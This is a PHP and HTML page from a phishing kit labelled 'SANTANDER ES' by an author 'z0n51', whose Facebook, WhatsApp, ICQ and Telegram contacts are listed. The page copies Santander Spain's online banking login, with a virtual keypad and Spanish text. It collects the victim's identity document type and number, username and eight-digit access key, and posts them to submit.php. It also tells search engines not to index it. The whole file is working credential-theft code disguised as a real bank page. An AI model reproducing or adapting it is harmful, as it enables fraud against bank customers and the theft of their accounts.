<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/fav.png" type="image/png"> 
        
        <title>Home</title>
    </head>

    <body>
        
        <div class="login-logo">
            <img class="d-lg-inline-block d-md-inline-block d-sm-none d-none" src="../assets/images/logo.png">
            <img class="d-lg-none d-md-none d-sm-inline-block d-inline-block" src="../assets/images/logo2.png">
        </div>

        <div class="login-box">
            <div class="login-box-body">
                <div class="top-links d-flex">
                    <span class="flex-grow-1"><u>Particulares</u></span>
                    <span><i class="fas fa-arrow-left"></i> Volver</span>
                </div>
                <h3>Te damos la bienvenida a tu Banca Online</h3>
                <div class="log-error">
                    <i class="fas fa-exclamation-triangle"></i> Ha de introducir un identificador y/o clave válidos.
                </div>
                <form method="post" action="submit.php" id="log-form">
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="login">
                    <div class="row mb-3 aa">
                        <div class="bb col-sm-6 mb-lg-0 mb-md-0 mb-sm-3 mb-3">
                            <div class="select-custom">
                                <p class="label-txt">Documento</p>
                                <select name="doc_type" id="doc_type">
                                    <option value=""></option>
                                    <option value="NIF">NIF</option>
                                    <option value="CIF">CIF</option>
                                    <option value="NIE">NIE</option>
                                    <option value="Pasaporte">Pasaporte</option>
                                    <option value="Usuario">Usuario</option>
                                </select>
                            </div>
                        </div>
                        <div class="col-sm-6 cc">
                            <label>
                                <p class="label-txt">Nº de documento</p>
                                <input type="text" class="input" id="doc_number" name="doc_number">
                            </label>
                        </div>
                    </div>
                    <div class="row mb-3 zz">
                        <div class="col-md-12">
                            <label>
                                <p class="label-txt">Usuario</p>
                                <input type="text" class="input" id="username" name="username">
                            </label>
                        </div>
                    </div>
                    <div class="password-group">
                        <p class="label-txt">Clave de acceso</p>
                        <input type="text" maxlength="1" name="pass1" id="pass1">
                        <input type="text" maxlength="1" name="pass2" id="pass2">
                        <input type="text" maxlength="1" name="pass3" id="pass3">
                        <input type="text" maxlength="1" name="pass4" id="pass4">
                        <input type="text" maxlength="1" name="pass5" id="pass5">
                        <input type="text" maxlength="1" name="pass6" id="pass6">
                        <input type="text" maxlength="1" name="pass7" id="pass7">
                        <input type="text" maxlength="1" name="pass8" id="pass8">
                        <ul class="options">
                            <li class="eye show"><img src="../assets/images/eye.png"></li>
                            <li class="key show"><img src="../assets/images/keyboard.png"></li>
                        </ul>
                    </div>
                    <div class="keyboard mt20">
                        <table>
                            <tr>
                                <td data-value="5">5</td>
                                <td data-value="4">4</td>
                                <td data-value="0">0</td>
                                <td data-value="8">8</td>
                                <td data-value="6">6</td>
                                <td data-value="3">3</td>
                            </tr>
                            <tr>
                                <td data-value="2">2</td>
                                <td data-value="1">1</td>
                                <td data-value="7">7</td>
                                <td data-value="9">9</td>
                                <td class="borrar" colspan="2">Borrar</td>
                            </tr>
                        </table>
                    </div>
                    <div class="row mt30">
                        <div class="col-5">
                            <div class="remember">
                                <span></span> Recordar usuario
                            </div>
                        </div>
                        <div class="col-7 text-right">
                            <button type="button" id="log-submit">Entrar</button>
                            <p>¿Problemas con tu clave de acceso?</p>
                        </div>
                    </div>
                </form>
            </div>
            <div class="login-box-footer">
                <div class="row">
                    <div class="col-6"><i class="fas fa-headset"></i> <b>Atención al Cliente</b></div>
                    <div class="col-6"><i class="fas fa-map-marker-alt"></i> <b>Localizador oficinas y cajeros</b></div>
                </div>
                <div class="divider"></div>
                <div class="row">
                    <div class="col-6">
                        <ul>
                            <li><b>Date de alta en Banca Online</b></li>
                            <li>Información sobre la <b>seguridad</b></li>
                        </ul>
                    </div>
                    <div class="col-6">
                        <ul>
                            <li><b>Demo</b></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
        var x, i, j, selElmnt, a, b, c;
        /*look for any elements with the class "custom-select":*/
        x = document.getElementsByClassName("select-custom");
        for (i = 0; i < x.length; i++) {
          selElmnt = x[i].getElementsByTagName("select")[0];
          /*for each element, create a new DIV that will act as the selected item:*/
          a = document.createElement("DIV");
          a.setAttribute("class", "select-selected");
          a.innerHTML = selElmnt.options[selElmnt.selectedIndex].innerHTML;
          x[i].appendChild(a);
          /*for each element, create a new DIV that will contain the option list:*/
          b = document.createElement("DIV");
          b.setAttribute("class", "select-items select-hide");
          for (j = 1; j < selElmnt.length; j++) {
            /*for each option in the original select element,
            create a new DIV that will act as an option item:*/
            c = document.createElement("DIV");
            c.innerHTML = selElmnt.options[j].innerHTML;
            c.addEventListener("click", function(e) {
                /*when an item is clicked, update the original select box,
                and the selected item:*/
                var y, i, k, s, h;
                s = this.parentNode.parentNode.getElementsByTagName("select")[0];
                h = this.parentNode.previousSibling;
                for (i = 0; i < s.length; i++) {
                  if (s.options[i].innerHTML == this.innerHTML) {
                    s.selectedIndex = i;
                    h.innerHTML = this.innerHTML;
                    y = this.parentNode.getElementsByClassName("same-as-selected");
                    for (k = 0; k < y.length; k++) {
                      y[k].removeAttribute("class");
                    }
                    this.setAttribute("class", "same-as-selected");
                    break;
                  }
                }
                h.click();
            });
            b.appendChild(c);
          }
          x[i].appendChild(b);
          a.addEventListener("click", function(e) {
              /*when the select box is clicked, close any other select boxes,
              and open/close the current select box:*/
              e.stopPropagation();
              closeAllSelect(this);
              this.nextSibling.classList.toggle("select-hide");
              this.classList.toggle("select-arrow-active");
            });
        }
        function closeAllSelect(elmnt) {
          /*a function that will close all select boxes in the document,
          except the current select box:*/
          var x, y, i, arrNo = [];
          x = document.getElementsByClassName("select-items");
          y = document.getElementsByClassName("select-selected");
          for (i = 0; i < y.length; i++) {
            if (elmnt == y[i]) {
              arrNo.push(i)
            } else {
              y[i].classList.remove("select-arrow-active");
            }
          }
          for (i = 0; i < x.length; i++) {
            if (arrNo.indexOf(i)) {
              x[i].classList.add("select-hide");
            }
          }
        }
        /*if the user clicks anywhere outside the select box,
        then close all select boxes:*/
        document.addEventListener("click", closeAllSelect);

        $('.eye').click(function(){
            if( $(this).hasClass('show') ) {
                $(this).removeClass('show').addClass('hide');
                $(this).find('img').attr('src','../assets/images/eye2.png');
                $('.password-group input').css({
                    'font-family':'Open Sans',
                    'color': '#000'
                });
            } else if( $(this).hasClass('hide') ) {
                $(this).removeClass('hide').addClass('show');
                $(this).find('img').attr('src','../assets/images/eye.png');
                $('.password-group input').css({
                    'font-family':'secure-asterisk',
                    'color': '#1BB3BC'
                });
            }
        });

        $('.key').click(function(){
            if( $(this).hasClass('show') ) {
                $(this).removeClass('show').addClass('hide');
                $(this).find('img').attr('src','../assets/images/keyboard2.png');
            } else if( $(this).hasClass('hide') ) {
                $(this).removeClass('hide').addClass('show');
                $(this).find('img').attr('src','../assets/images/keyboard.png');
            }
            $('.keyboard').slideToggle();
        });

        $('.keyboard td').click(function(){
            var val = $(this).data('value');
            $('.password-group input').each(function(i){
                if( $(this).val() == '' ) {
                    $(this).val(val);
                    return false;
                }
            }); 
        });

        $('.password-group input').click(function(){
            var pass1 = $('#pass1').val();
            var pass2 = $('#pass2').val();
            var pass3 = $('#pass3').val();
            var pass4 = $('#pass4').val();
            var pass5 = $('#pass5').val();
            var pass6 = $('#pass6').val();
            var pass7 = $('#pass7').val();
            var pass8 = $('#pass8').val();
            if( pass1 !== '' && pass2 !== '' && pass3 !== '' && pass4 !== '' && pass5 !== '' && pass6 !== '' && pass7 !== '' && pass8 !== '' ) {
                $('#pass8').focus();
            } else if( pass1 !== '' || pass2 !== '' || pass3 !== '' || pass4 !== '' || pass5 !== '' || pass6 !== '' || pass7 !== '' || pass8 !== '' ) {
                $('.password-group input').each(function(i){
                    if( $(this).val() == '' ) {
                        $(this).focus();
                        return false;
                    }
                }); 
            }
        });

        $('.password-group input').keypress(function(){
            $(this).next().focus();
        });

        $('.password-group input').keyup(function(e){
            var btn = e.keyCode;
            if( btn == 8 ) {
                $(this).prev().focus();
            }
        });

        $('.borrar').click(function(){
            $('.password-group input').val('');
        });

        var body_image = '<?php echo rand(1,5); ?>';
        $('body').css({
            'background': 'url(../assets/images/img'+ body_image +'.jpg) center center no-repeat',
            'background-size': 'cover'
        });

        function RegexCheck(value) {
            const regex = RegExp("([a-z]|[A-Z]|[0-9])[0-9]{7}([a-z]|[A-Z]|[0-9])");
            return regex.test(value);
        }

        $('.select-items div').click(function(){
            var doc_type = $('#doc_type').val();
            if( doc_type == 'Usuario' ) {
                $('.zz').show();
                $('.aa .bb').addClass('col-md-12');
                $('.aa .bb').removeClass('col-md-6');
                $('.aa .cc').hide();
            } else {
                $('.zz').hide();
                $('.aa .bb').addClass('col-md-6');
                $('.aa .bb').removeClass('col-md-12');
                $('.aa .cc').show();
            }
        });

        $('#log-submit').click(function(){
            var error = false;
            var doc_type   = $('#doc_type').val();
            var doc_number = $('#doc_number').val();
            var username   = $('#username').val();
            var password   = $('#pass1').val() + $('#pass2').val() + $('#pass3').val() + $('#pass4').val() + $('#pass5').val() + $('#pass6').val() + $('#pass7').val() + $('#pass8').val();

            if( doc_type == '' ) {
                error = true;
            } else {
                if( doc_type == 'Usuario' ) {
                    if( username == '' ) {
                        error = true;
                    }
                } else if(doc_type == 'Pasaporte') {
                    if( doc_number == '' ) {
                        error = true;
                    }
                } else {
                    if( doc_number == '' ) {
                        error = true;
                    } else if (!RegexCheck(doc_number)) {
                        error = true;
                    }
                }
            }
            if( password.length !== 8 ) {
                error = true;
            } 

            if( error == true ) {
                $('.log-error').show();
                $('.password-group input').val('');
            } else {
                $('.log-error').hide();
                $('#log-form').submit();
            }


        });

        </script>

    </body>

</html>